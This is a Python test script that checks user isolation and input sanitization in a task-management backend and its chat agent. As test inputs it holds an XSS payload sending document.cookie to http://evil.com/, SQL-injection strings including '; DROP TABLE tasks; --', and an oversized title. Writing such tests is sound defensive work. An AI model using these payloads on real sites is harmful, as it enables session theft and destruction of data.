"""
Test script for security validation
This script tests user_id scoping and input sanitization
"""
import asyncio
from backend.agents.chat_agent import run_chat_agent
from backend.mcp.tools.task_operations import add_task_tool, list_tasks_tool, complete_task_tool, delete_task_tool, update_task_tool
from backend.mcp.tools.task_operations import AddTaskParams, ListTasksParams, CompleteTaskParams, DeleteTaskParams, UpdateTaskParams
from uuid import uuid4


async def test_security_validation():
    """Test security validation for user_id scoping and input sanitization"""

    print("Testing security validation...")

    # Create two different user IDs
    user1_id = str(uuid4())
    user2_id = str(uuid4())

    print(f"\n1. Testing user isolation with User 1: {user1_id[:8]}... and User 2: {user2_id[:8]}...")

    # Add tasks for User 1
    print("\nAdding tasks for User 1...")
    user1_task1 = await add_task_tool(AddTaskParams(
        user_id=user1_id,
        title="User 1 Task 1",
        description="Task for user 1 only"
    ))
    print(f"User 1 task 1 result: {user1_task1}")

    user1_task2 = await add_task_tool(AddTaskParams(
        user_id=user1_id,
        title="User 1 Task 2",
        description="Another task for user 1"
    ))
    print(f"User 1 task 2 result: {user1_task2}")

    # Add tasks for User 2
    print("\nAdding tasks for User 2...")
    user2_task1 = await add_task_tool(AddTaskParams(
        user_id=user2_id,
        title="User 2 Task 1",
        description="Task for user 2 only"
    ))
    print(f"User 2 task 1 result: {user2_task1}")

    user2_task2 = await add_task_tool(AddTaskParams(
        user_id=user2_id,
        title="User 2 Task 2",
        description="Another task for user 2"
    ))
    print(f"User 2 task 2 result: {user2_task2}")

    # Test 1: Verify User 1 can only see their own tasks
    print("\n2. Verifying User 1 can only see their own tasks:")
    user1_tasks = await list_tasks_tool(ListTasksParams(
        user_id=user1_id,
        status="all"
    ))
    print(f"User 1 tasks: {[t['title'] for t in user1_tasks.get('tasks', [])]}")

    user1_task_titles = [t['title'] for t in user1_tasks.get('tasks', [])]
    if "User 1 Task 1" in user1_task_titles and "User 1 Task 2" in user1_task_titles:
        print("✓ User 1 can see their own tasks")
    else:
        print("✗ User 1 cannot see their own tasks")

    if "User 2 Task 1" not in user1_task_titles and "User 2 Task 2" not in user1_task_titles:
        print("✓ User 1 cannot see User 2's tasks")
    else:
        print("✗ User 1 can see User 2's tasks - SECURITY ISSUE!")

    # Test 2: Verify User 2 can only see their own tasks
    print("\n3. Verifying User 2 can only see their own tasks:")
    user2_tasks = await list_tasks_tool(ListTasksParams(
        user_id=user2_id,
        status="all"
    ))
    print(f"User 2 tasks: {[t['title'] for t in user2_tasks.get('tasks', [])]}")

    user2_task_titles = [t['title'] for t in user2_tasks.get('tasks', [])]
    if "User 2 Task 1" in user2_task_titles and "User 2 Task 2" in user2_task_titles:
        print("✓ User 2 can see their own tasks")
    else:
        print("✗ User 2 cannot see their own tasks")

    if "User 1 Task 1" not in user2_task_titles and "User 1 Task 2" not in user2_task_titles:
        print("✓ User 2 cannot see User 1's tasks")
    else:
        print("✗ User 2 can see User 1's tasks - SECURITY ISSUE!")

    # Test 3: Try to access User 1's task from User 2 account (should fail)
    print("\n4. Testing cross-user access attempt:")
    user1_task_id = user1_task1.get("task", {}).get("id")
    if user1_task_id:
        print(f"Attempting to complete User 1's task {user1_task_id} from User 2 account...")
        result = await complete_task_tool(CompleteTaskParams(
            user_id=user2_id,
            task_id=str(user1_task_id)
        ))

        if not result.get("success"):
            print("✓ Cross-user access correctly blocked")
            print(f"  Error message: {result.get('message', result.get('error'))}")
        else:
            print("✗ Cross-user access allowed - SECURITY ISSUE!")
    else:
        print("Could not test cross-user access - no task ID available")

    # Test 4: Input sanitization - try to inject malicious content
    print("\n5. Testing input sanitization:")

    # Try to add a task with potentially malicious content
    malicious_title = "<script>alert('XSS')</script> Normal Task"
    malicious_description = "Description with ' OR '1'='1' --"

    print("Adding task with potentially malicious content...")
    mal_result = await add_task_tool(AddTaskParams(
        user_id=user1_id,
        title=malicious_title,
        description=malicious_description
    ))

    if mal_result.get("success"):
        print("✓ Malicious input was accepted (this may be intentional depending on use case)")
        # Check if the content was sanitized
        task_id = mal_result["task"]["id"]
        updated_tasks = await list_tasks_tool(ListTasksParams(
            user_id=user1_id,
            status="all"
        ))

        saved_task = None
        for task in updated_tasks.get("tasks", []):
            if str(task["id"]) == str(task_id):
                saved_task = task
                break

        if saved_task:
            print(f"  Saved title: {saved_task['title']}")
            print(f"  Saved description: {saved_task['description']}")

            # Check if basic XSS was prevented
            if "<script>" in saved_task['title'] or "<script>" in saved_task['description']:
                print("  ⚠ Potential XSS vulnerability detected")
            else:
                print("  ✓ Basic XSS protection appears to be working")
    else:
        print("✓ Malicious input was rejected")
        print(f"  Error: {mal_result.get('error')}")

    # Test 5: Test with SQL injection-like input
    print("\n6. Testing SQL injection-like input:")
    sql_like_title = "Test ' OR '1'='1' --"

    sql_result = await add_task_tool(AddTaskParams(
        user_id=user1_id,
        title=sql_like_title,
        description="SQL injection test"
    ))

    if sql_result.get("success"):
        print("✓ SQL-like input was accepted")
        # The database should handle this safely through parameterized queries
    else:
        print("✓ SQL-like input was rejected")

    # Test 6: Test with very long input to check for buffer overflow
    print("\n7. Testing with very long input:")
    long_title = "A" * 10000  # Very long title

    long_result = await add_task_tool(AddTaskParams(
        user_id=user1_id,
        title=long_title,
        description="Long input test"
    ))

    if long_result.get("success"):
        print("✓ Long input was accepted")
    else:
        print("✓ Long input was rejected due to length limits")
        print(f"  Error: {long_result.get('error')}")

    # Test 7: Test chat agent with malicious input
    print("\n8. Testing chat agent with potentially malicious input:")

    conversation_history = []
    agent_response = await run_chat_agent(
        user_id=user1_id,
        user_message="<script>document.location='http://evil.com/'+document.cookie</script>",
        conversation_history=conversation_history
    )

    print(f"Agent response to XSS attempt: {agent_response['response'][:100]}...")

    # Test 8: Test with command injection attempt
    command_response = await run_chat_agent(
        user_id=user1_id,
        user_message="; DROP TABLE tasks; --",
        conversation_history=conversation_history
    )

    print(f"Agent response to SQL injection attempt: {command_response['response'][:100]}...")

    print("\nSecurity validation completed!")


if __name__ == "__main__":
    asyncio.run(test_security_validation())